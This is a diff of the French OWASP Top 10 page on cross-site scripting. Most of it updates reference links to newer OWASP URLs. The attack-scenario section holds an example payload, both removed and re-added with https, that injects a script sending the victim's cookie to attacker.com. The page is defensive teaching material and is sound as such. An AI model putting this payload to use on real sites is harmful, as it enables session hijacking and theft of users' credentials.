@@ -21,8 +21,8 @@ Se protéger des attaques XSS nécessite la séparation des données non sûres 
 Pour cela :
 
 * Utiliser des frameworks avec des techniques automatiques d'échappements XSS par conception, comme les dernières versions de Ruby on Rails et React JS. Regarder les limitations de protection XSS de votre framework et prendre les mesures appropriées pour couvrir les cas non gérés.
-* Appliquer des techniques d'échappement aux données des requêtes HTTP non sûres, selon le contexte des sorties HTML dans lequel elles seront insérées (body, attribute, Javascript, CSS, ou URL). Cela résoudra les vulnérabilités des XSS Réfléchis ou Stockés. L'[Aide-mémoire de l'OWASP 'Prévention des XSS'](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet) donne des détails sur les techniques requises d'échappement des données.
-* Appliquer un encodage adapté au contexte lors des modifications des documents du navigateur du client est une protection contre les XSS basés sur DOM. Quand cela ne peut pas être évité, des techniques d'échappement, adaptées au contexte, peuvent être appliquées aux API du navigateur comme indiqué dans l'[Aide-mémoire de l'OWASP 'Prévention des XSS basés sur DOM'](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet).
+* Appliquer des techniques d'échappement aux données des requêtes HTTP non sûres, selon le contexte des sorties HTML dans lequel elles seront insérées (body, attribute, Javascript, CSS, ou URL). Cela résoudra les vulnérabilités des XSS Réfléchis ou Stockés. L'[Aide-mémoire de l'OWASP 'Prévention des XSS'](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) donne des détails sur les techniques requises d'échappement des données.
+* Appliquer un encodage adapté au contexte lors des modifications des documents du navigateur du client est une protection contre les XSS basés sur DOM. Quand cela ne peut pas être évité, des techniques d'échappement, adaptées au contexte, peuvent être appliquées aux API du navigateur comme indiqué dans l'[Aide-mémoire de l'OWASP 'Prévention des XSS basés sur DOM'](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).
 * Etablir une [Politique de Sécurité du Contenu (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) comme mesure de défense en profondeur limitant les attaques XSS. Cela sera efficace, s'il n'y a pas d'autre vulnérabilité qui permettrait de déposer du code malicieux par insertion de fichier en local (ex : écrasement par attaque de type "traversée de répertoire" ou via des bibliothèques vulnérables des réseaux de diffusion de contenu (CDN) autorisés).
 
 ## Exemple de Scénario d'Attaque
@@ -32,7 +32,7 @@ Pour cela :
 `(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";`
 
 L'attaquant remplace le paramètre ‘CC’ du navigateur par :
-`'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'`
+`'><script>document.location='https://attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'`
 
 Cette attaque envoie l'ID de session de la victime vers le site web de l'attaquant, lui permettant ainsi de détourner la session active de l'utilisateur.
 
@@ -42,16 +42,16 @@ Cette attaque envoie l'ID de session de la victime vers le site web de l'attaqua
 
 ### OWASP
 
-* [OWASP Contrôles Proactifs : Encoder les Données](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
-* [OWASP Contrôles Proactifs : Valider les Données](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
-* [OWASP Standard de Vérification de la Sécurité des Applications : V5](https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project)
-* [OWASP Guide de Test : Test des XSS Réfléchis](https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001))
-* [OWASP Guide de Test : Test des XSS Stockés](https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002))
-* [OWASP Guide de Test : Test des XSS basés sur DOM](https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001))
-* [OWASP Aide-Mémoire : Prévention du XSS ](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
-* [OWASP Aide-Mémoire : Prévention du XSS basé sur DOM](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet)
-* [OWASP Aide-Mémoire : Contournements de Filtres XSS ](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
-* [OWASP Projet Java Encodeur](https://www.owasp.org/index.php/OWASP_Java_Encoder_Project)
+* [OWASP Contrôles Proactifs : Encoder les Données](https://owasp.org/www-project-proactive-controls/v3/en/c4-encode-escape-data)
+* [OWASP Contrôles Proactifs : Valider les Données](https://owasp.org/www-project-proactive-controls/v3/en/c4-encode-escape-data)
+* [OWASP Standard de Vérification de la Sécurité des Applications : V5](https://owasp.org/www-project-application-security-verification-standard/)
+* [OWASP Guide de Test : Test des XSS Réfléchis](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting)
+* [OWASP Guide de Test : Test des XSS Stockés](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting)
+* [OWASP Guide de Test : Test des XSS basés sur DOM](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting)
+* [OWASP Aide-Mémoire : Prévention du XSS ](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+* [OWASP Aide-Mémoire : Prévention du XSS basé sur DOM](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
+* [OWASP Aide-Mémoire : Contournements de Filtres XSS ](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
+* [OWASP Projet Java Encodeur](https://owasp.org/www-project-java-encoder/)
 
 ### Externes
 
